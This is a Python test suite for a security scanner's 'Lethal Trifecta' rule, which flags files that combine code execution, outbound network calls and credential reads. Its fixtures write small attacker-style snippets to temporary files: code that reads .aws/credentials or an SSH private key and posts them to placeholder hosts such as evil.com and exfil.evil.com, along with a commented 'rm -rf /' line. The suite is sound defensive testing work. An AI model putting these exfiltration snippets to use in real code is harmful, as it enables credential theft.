"""Tests for Rule 19 (Lethal Trifecta) in forensics_core.correlate().

Rule 19: exec + outbound network + credential read in the same file.
Named after Snyk's terminology. Catches ~91% of credential-stealing skills
per the SkillSafe ClawHavoc post-mortem.

Also verifies Rule 18 was correctly renumbered (previously a duplicate of
Rule 16 in the source comments).

Created 2026-04-05 as part of PR#A.
"""

import pytest
import forensics_core as core
from forensics_core import Finding


def _make(scanner_name, title, description, category, filepath="attacker.py"):
    """Test helper to build a Finding with keyword-rich fields."""
    return Finding(
        scanner=scanner_name,
        severity="medium",
        title=title,
        description=description,
        file=filepath,
        line=1,
        snippet=title,
        category=category,
    )


class TestLethalTrifectaFires:
    """All three primitives in the same file must fire Rule 19.

    Descriptions here mirror what real sub-scanners actually emit: specific
    API calls (os.system, subprocess.run, requests.post) or category phrases
    (code execution, data exfiltration, credential read). Bare keywords like
    'exec', 'post', '.env' are deliberately NOT used — see TestLethalTrifecta
    FalsePositives below for why.
    """

    def test_exec_network_credential_same_file(self):
        findings = [
            _make("sast", "os.system invocation",
                  "os.system call with shell=true", "code-execution"),
            _make("dataflow", "requests.post to external endpoint",
                  "data exfiltration via requests.post", "exfiltration"),
            _make("secrets", "AWS credential read",
                  ".aws/credentials file access", "credential read"),
        ]
        correlated = core.correlate(findings)
        trifecta = [c for c in correlated if c.category == "lethal-trifecta"]
        assert len(trifecta) == 1
        assert trifecta[0].severity == "critical"

    def test_subprocess_curl_ssh_key(self):
        findings = [
            _make("sast", "subprocess.run shell call",
                  "subprocess.run with shell=true", "code-execution"),
            _make("dataflow", "curl outbound exfiltration",
                  "curl to external host, data exfiltration", "exfiltration"),
            _make("secrets", "id_ed25519 credential read",
                  "reads ~/.ssh/id_ed25519 private key", "credential-read"),
        ]
        correlated = core.correlate(findings)
        assert any(c.category == "lethal-trifecta" for c in correlated)

    def test_eval_fetch_github_token(self):
        findings = [
            _make("sast", "eval() code execution",
                  "eval( call — arbitrary code execution", "code-execution"),
            _make("dataflow", "node-fetch outbound POST",
                  "node-fetch webhook post to external", "exfiltration"),
            _make("secrets", "GITHUB_TOKEN read",
                  "github_token credential read", "credential-read"),
        ]
        correlated = core.correlate(findings)
        assert any(c.category == "lethal-trifecta" for c in correlated)

    def test_child_process_webhook_dot_netrc(self):
        findings = [
            _make("sast", "child_process.spawn shell",
                  "child_process.spawn with shell=true", "code-execution"),
            _make("dataflow", "discord webhook post",
                  "webhook-post to discord.com/api/webhooks",
                  "webhook exfil"),
            _make("secrets", ".netrc credential read",
                  "reads .netrc file with credentials", "credential-read"),
        ]
        correlated = core.correlate(findings)
        assert any(c.category == "lethal-trifecta" for c in correlated)


class TestLethalTrifectaDoesNotFire:
    """Partial matches must NOT fire Rule 19 (avoid false positives)."""

    def test_exec_network_without_credential(self):
        findings = [
            _make("sast", "os.system call", "os.system( execution", "code-execution"),
            _make("dataflow", "outbound request", "outbound http fetch", "network"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_exec_credential_without_network(self):
        findings = [
            _make("sast", "eval() call", "eval( code execution", "code-execution"),
            _make("secrets", ".aws/credentials read",
                  ".aws/credentials credential read", "credential-read"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_network_credential_without_exec(self):
        findings = [
            _make("dataflow", "webhook post",
                  "outbound http webhook-post to external", "exfiltration"),
            _make("secrets", "API key credential read",
                  "api-key read from env", "credential-read"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_only_exec(self):
        findings = [
            _make("sast", "eval()", "eval( code execution", "code-execution"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_empty(self):
        assert core.correlate([]) == []

    def test_three_primitives_different_files(self):
        """Cross-file splitting: exec in file A, network in B, credential in C.

        Rule 19 is currently per-file, so this should NOT fire. (Module-level
        correlation is listed in the security review as a harder P1 upgrade.)
        """
        findings = [
            _make("sast", "os.system( call", "os.system code execution",
                  "code-execution", filepath="a.py"),
            _make("dataflow", "webhook post",
                  "outbound http webhook exfil", "exfiltration", filepath="b.py"),
            _make("secrets", ".aws/credentials read",
                  ".aws/credentials file access", "credential-read",
                  filepath="c.py"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)


class TestLethalTrifectaFalsePositiveDefenses:
    """Regression tests for the 2026-04-05 code review false positives.

    Each test here represents a scenario Rule 19 PREVIOUSLY false-positive'd
    on before the keyword narrowing and distinct-scanner requirement. If any
    of these start flagging, we've reintroduced the false positive factory.
    """

    def test_ci_build_script_not_flagged(self):
        """Normal Python CI build scripts use subprocess + urllib + .env.
        None of those should trip Rule 19 when used for legitimate build
        purposes (no 'code execution' / 'exfiltration' / 'credential read'
        markers in the descriptions)."""
        findings = [
            _make("sast", "subprocess usage",
                  "subprocess used for build step", "sast"),
            _make("dataflow", "urllib usage",
                  "urllib used to fetch build artifact", "network"),
            _make("secrets", ".env path reference",
                  "script references .env file for CI variables",
                  "config-read"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_execute_permission_is_not_exec_primitive(self):
        """The word 'execute' in 'Execute permission' from an infra scanner
        must not be read as code execution."""
        findings = [
            _make("infra", "Execute permission",
                  "file has execute permission set", "perms"),
            _make("lifecycle", "post-install hook declared",
                  "package declares post-install script", "lifecycle"),
            _make("manifest", ".env.example present",
                  "repository includes .env.example template", "config"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_websocket_is_not_network_primitive(self):
        """'socket' as substring of 'websocket' must not match the network
        keyword set."""
        findings = [
            _make("sast", "eval() call", "eval( code execution",
                  "code-execution"),
            _make("dependencies", "websocket package",
                  "ws library used for websocket", "dependency"),
            _make("secrets", "api_key comment",
                  "api_key referenced in docstring", "config"),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_postgres_is_not_post_primitive(self):
        """'post' substring of 'postgres' / 'post-install' must not match
        'http post' network keyword."""
        findings = [
            _make("sast", "eval() call", "eval( code execution",
                  "code-execution"),
            _make("dataflow", "postgres connection",
                  "connects to postgres://localhost", "database"),
            _make("secrets", ".aws/credentials read",
                  ".aws/credentials file access", "credential-read"),
        ]
        correlated = core.correlate(findings)
        # This has exec + credential but the network primitive is postgres,
        # not an actual outbound exfil. Rule 19 should NOT fire.
        assert not any(c.category == "lethal-trifecta" for c in correlated)

    def test_single_noisy_finding_does_not_self_fire(self):
        """A single finding mentioning all three primitive keywords in its
        description must not trip Rule 19 on its own. This is the
        distinct-scanners defense — at least 2 scanners must contribute."""
        findings = [
            _make(
                "skill_threats",
                "Kitchen-sink suspicious file",
                "file has os.system call and requests.post and "
                ".aws/credentials read all together",
                "suspicious-all-in-one",
            ),
        ]
        correlated = core.correlate(findings)
        assert not any(c.category == "lethal-trifecta" for c in correlated)


class TestLethalTrifectaAttribution:
    """The finding must carry enough context for incident response."""

    # Shared canonical fixture using descriptions that match the narrower
    # keyword sets. Each primitive comes from a different scanner so the
    # distinct-scanners defense passes.
    @staticmethod
    def _canonical_findings():
        return [
            _make("sast", "os.system( call",
                  "os.system code execution", "code-execution"),
            _make("dataflow", "requests.post to webhook",
                  "requests.post webhook-post exfiltration", "exfiltration"),
            _make("secrets", ".aws/credentials read",
                  ".aws/credentials credential read", "credential-read"),
        ]

    def test_severity_critical(self):
        correlated = core.correlate(self._canonical_findings())
        trifecta = [c for c in correlated if c.category == "lethal-trifecta"]
        assert trifecta[0].severity == "critical"

    def test_title_names_pattern(self):
        correlated = core.correlate(self._canonical_findings())
        trifecta = [c for c in correlated if c.category == "lethal-trifecta"]
        assert "Lethal Trifecta" in trifecta[0].title

    def test_description_references_snyk(self):
        correlated = core.correlate(self._canonical_findings())
        trifecta = [c for c in correlated if c.category == "lethal-trifecta"]
        assert (
            "Snyk" in trifecta[0].description
            or "ClawHavoc" in trifecta[0].description
        )


class TestLethalTrifectaCoexistsWithExistingRules:
    """When Rule 19 fires, Rule 1 (env+network) might also fire. Both findings
    should emit — they carry different attribution value. The only constraint
    is no duplicate finding with identical attributes."""

    def test_rule1_and_rule19_both_fire(self):
        findings = [
            _make("sast", "os.system( call",
                  "os.system code execution", "code-execution"),
            _make("dataflow", "outbound webhook post",
                  "requests.post network outbound to webhook",
                  "exfiltration"),
            _make("secrets", "env credential read",
                  ".env credential read for api_key", "credential-read"),
        ]
        correlated = core.correlate(findings)
        titles = [c.title for c in correlated]
        # Rule 19 should surface
        assert any("Lethal Trifecta" in t for t in titles)
        # Rule 1 or Rule 3 should also fire on env + network
        assert any(
            "Exfiltration" in t or "Credential Theft" in t for t in titles
        )


class TestRule18Renumbering:
    """Sanity-check that the previously-mislabeled '.pth + known-ioc' rule
    still fires after being renamed from duplicate Rule 16 to Rule 18."""

    def test_pth_plus_known_ioc_still_fires(self):
        findings = [
            _make("lifecycle", ".pth file present", "pth-injection vector", "pth-injection"),
            _make("dependencies", "Known malicious package", "ioc database match", "known-ioc"),
        ]
        correlated = core.correlate(findings)
        assert any(
            c.title == "Known Supply Chain .pth Attack" for c in correlated
        )


class TestTrifectaRawScannerAttribution:
    """CRC-F3 regression: detect_trifecta_raw previously emitted line=0 and
    canned snippets. It now iterates line-by-line and records the actual
    line number and matching code. Without this, CRITICAL Rule 19 findings
    were un-triageable — reviewers would have to re-grep by hand."""

    def test_attribution_includes_line_numbers(self, tmp_path):
        evil = tmp_path / "evil.py"
        evil.write_text(
            "# line 1\n"
            "# line 2\n"
            "import subprocess  # line 3\n"
            "# line 4\n"
            "def attack():  # line 5\n"
            "    subprocess.run(['curl', 'https://evil.com'])  # line 6\n"
            "    with open('/home/user/.aws/credentials') as f:  # line 7\n"
            "        data = f.read()  # line 8\n"
            "    import requests  # line 9\n"
            "    requests.post('https://attacker.io', data=data)  # line 10\n"
        )
        findings = core.detect_trifecta_raw(str(tmp_path))
        # Should emit exactly 3 findings (one per primitive)
        assert len(findings) == 3
        # Each finding must have a non-zero line number
        for f in findings:
            assert f.line > 0, f"Finding {f.title} has line=0 (attribution regression)"
        # Snippets must contain actual code, not canned strings
        snippets = {f.title: f.snippet for f in findings}
        assert "subprocess.run" in snippets["Code execution primitive"]
        assert ".aws/credentials" in snippets["Credential read primitive"]


class TestTrifectaRawScannerFalsePositiveDefenses:
    """CRC-F2 regression: the raw scanner regexes previously matched bare
    prose keywords (`webhook`, `api_key`, `reverse shell`, `keychain`)
    inside comments, docstrings, and variable names, causing Rule 19 to
    false-positive on legitimate CI/integration repos."""

    def test_ci_build_script_with_webhook_comment_not_flagged(self, tmp_path):
        """A CI script using subprocess + env var load + a comment mentioning
        'webhook' must NOT fire trifecta_raw."""
        script = tmp_path / "ci.py"
        script.write_text(
            "# CI build script that handles webhook callbacks\n"
            "import subprocess, os\n"
            "# Load the api_key for build notifications\n"
            "token = os.environ.get('BUILD_API_KEY')\n"
            "subprocess.run(['npm', 'run', 'build'])\n"
            "# This comment mentions webhook and browser data for doc purposes\n"
        )
        findings = core.detect_trifecta_raw(str(tmp_path))
        # Would previously emit 3 findings due to webhook/api_key/browser data
        # matching bare keywords in comments. Now: zero.
        assert len(findings) == 0, (
            f"CI script false-positived on trifecta_raw: {[f.title for f in findings]}"
        )

    def test_api_key_in_variable_name_not_flagged(self, tmp_path):
        """A file with `api_key` as a variable name but no actual credential
        file access must not match the credential primitive."""
        script = tmp_path / "utils.py"
        script.write_text(
            "def get_api_key():\n"
            "    return 'public-key'\n"
            "import subprocess\n"
            "subprocess.run(['ls'])\n"
            "import requests\n"
            "requests.get('https://example.com')\n"
        )
        findings = core.detect_trifecta_raw(str(tmp_path))
        credential_findings = [f for f in findings if "Credential" in f.title]
        assert len(credential_findings) == 0, (
            "bare 'api_key' as variable name must not match credential primitive"
        )

    def test_comment_only_lines_are_skipped(self, tmp_path):
        """Lines starting with #, //, ;; etc are comments and must not
        contribute to primitive matches."""
        script = tmp_path / "commented.py"
        script.write_text(
            "# subprocess.run(['rm', '-rf', '/'])\n"
            "# requests.post('https://evil.com')\n"
            "# /home/user/.aws/credentials\n"
            "print('hello')\n"
        )
        findings = core.detect_trifecta_raw(str(tmp_path))
        # All three primitives are in comments only — should emit zero
        assert len(findings) == 0

    def test_real_attack_still_fires(self, tmp_path):
        """Sanity: a file with real executable primitives on code lines
        must still fire all three."""
        evil = tmp_path / "malware.py"
        evil.write_text(
            "import subprocess, requests\n"
            "with open('/home/victim/.ssh/id_rsa') as f:\n"
            "    key = f.read()\n"
            "subprocess.run(['curl', '-X', 'POST', 'https://c2.evil.com'])\n"
            "requests.post('https://exfil.evil.com', data={'key': key})\n"
        )
        findings = core.detect_trifecta_raw(str(tmp_path))
        assert len(findings) == 3, (
            f"real attack should fire all 3 primitives: {[f.title for f in findings]}"
        )
